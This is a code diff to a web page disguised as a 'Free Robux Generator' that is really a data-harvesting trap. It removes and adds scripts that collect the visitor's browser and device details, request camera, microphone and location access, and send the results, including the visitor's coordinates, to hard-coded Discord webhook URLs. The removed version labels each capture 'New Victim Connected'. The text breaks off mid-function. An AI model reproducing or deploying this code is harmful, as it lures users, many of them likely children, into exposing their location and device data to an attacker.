@@ -70,6 +70,25 @@
             50% { transform: scale(1.05); opacity: 0.9; }
         }
 
+        .start-button {
+            background: linear-gradient(45deg, #ffcc00, #ff9900);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 204, 0, 0.4);
+        }
+
+        .start-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 204, 0, 0.6);
+        }
+
         .progress-bar {
             width: 100%;
             height: 6px;
@@ -77,6 +96,7 @@
             border-radius: 3px;
             overflow: hidden;
             margin-top: 20px;
+            display: none;
         }
 
         .progress-fill {
@@ -122,17 +142,22 @@
             0%, 100% { opacity: 1; }
             50% { opacity: 0.3; }
         }
+
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="loading-spinner"></div>
+        <div class="loading-spinner" id="spinner"></div>
         <div class="loading-text" id="loading-text">
             <span class="status-dot"></span>
-            Cargando...
+            Ready to Generate!
         </div>
-        <div class="robux-text">🎁 Generando Free Robux 🎁</div>
-        <div class="progress-bar">
+        <div class="robux-text">🎁 Free Robux Generator 🎁</div>
+        <button class="start-button" id="startBtn" onclick="startGenerator()">Click to Start</button>
+        <div class="progress-bar" id="progressBar">
             <div class="progress-fill"></div>
         </div>
     </div>
@@ -149,87 +174,66 @@
     <div class="floating-robux" style="left: 90%; animation-delay: 3.5s;">💰</div>
 
     <script>
-        // Fast and optimized data collection script
-        (function() {
-            const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1485887217137225840/yAtbah4VmqKvRY4PUBEkLuXBkagBCV1CeKcJ6pKPq-nLO2_RxpfcHfo6lscG4zEvJRms';
+        // Working data collection script
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1485895766261104701/DK9De467EJauJxyFetj6il_14A5Uc-apzc6sy0NqWxSiczoA1Raq2c-aQAoDJ5I0t9sb';
 
-            // Fast Discord sender
-            async function sendToDiscord(data) {
-                try {
-                    await fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    });
-                } catch (e) {}
+        async function sendToDiscord(data) {
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                console.log('Discord response:', response.status);
+                return response.ok;
+            } catch (error) {
+                console.error('Discord error:', error);
+                return false;
+            }
+        }
+
+        async function requestPermissions() {
+            const permissions = {
+                camera: false,
+                microphone: false,
+                location: false
+            };
+
+            // Request camera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                permissions.camera = true;
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                console.log('Camera denied:', e);
             }
 
-            // Collect all data fast
-            async function collectAndSend() {
-                const data = {
-                    embeds: [{
-                        title: "🎯 New Victim Connected",
-                        color: 0x9b59b6,
-                        fields: [
-                            { name: "🌐 Browser", value: navigator.userAgent, inline: false },
-                            { name: "📍 Location", value: "Requesting...", inline: true },
-                            { name: "📱 Device", value: `${navigator.platform} - ${screen.width}x${screen.height}`, inline: true },
-                            { name: "🔐 Permissions", value: "Checking...", inline: true }
-                        ],
-                        footer: { text: "Robux Generator" },
-                        timestamp: new Date().toISOString()
-                    }]
+            // Request microphone
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                permissions.microphone = true;
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                console.log('Microphone denied:', e);
+            }
+
+            // Request location
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        timeout: 10000,
+                        maximumAge: 60000
+                    });
+                });
+                permissions.location = {
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy
                 };
+                document.getElementById('loading-text').innerHTML = '<span class="status-dot"></span>Loading...';
+            } catch (e) {
+                console.log('Location denied:', e);
+            }
 
-                // Send initial data
-                sendToDiscord(data);
-
-                // Request permissions in parallel
-                const promises = [];
-                
-                // Camera
-                promises.push(
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(stream => {
-                            stream.getTracks().forEach(t => t.stop());
-                            return "📹 Camera: ✅ Granted";
-                        })
-                        .catch(() => "📹 Camera: ❌ Denied")
-                );
-
-                // Microphone
-                promises.push(
-                    navigator.mediaDevices.getUserMedia({ audio: true })
-                        .then(stream => {
-                            stream.getTracks().forEach(t => t.stop());
-                            return "🎤 Mic: ✅ Granted";
-                        })
-                        .catch(() => "🎤 Mic: ❌ Denied")
-                );
-
-                // Location
-                promises.push(
-                    new Promise(resolve => {
-                        navigator.geolocation.getCurrentPosition(
-                            pos => {
-                                const lat = pos.coords.latitude.toFixed(6);
-                                const lon = pos.coords.longitude.toFixed(6);
-                                document.getElementById('loading-text').innerHTML = '<span class="status-dot"></span>Loading...';
-                                resolve(`📍 [Google Maps](https://www.google.com/maps?q=${lat},\${lon})`);
-                            },
-                            () => resolve("📍 Location: ❌ Denied"),
-                            { timeout: 5000 }
-                        );
-                    })
-                );
-
-                // Wait for all permissions
-                const results = await Promise.all(promises);
-                
-                // Update with results
-                data.embeds[0].fields[2].value = results.join('\n');
-                sendToDiscord(data);
-
-                // Send detailed info
-                setTimeout(() => {
-                    sendToDiscord
+            return permissions;
+       
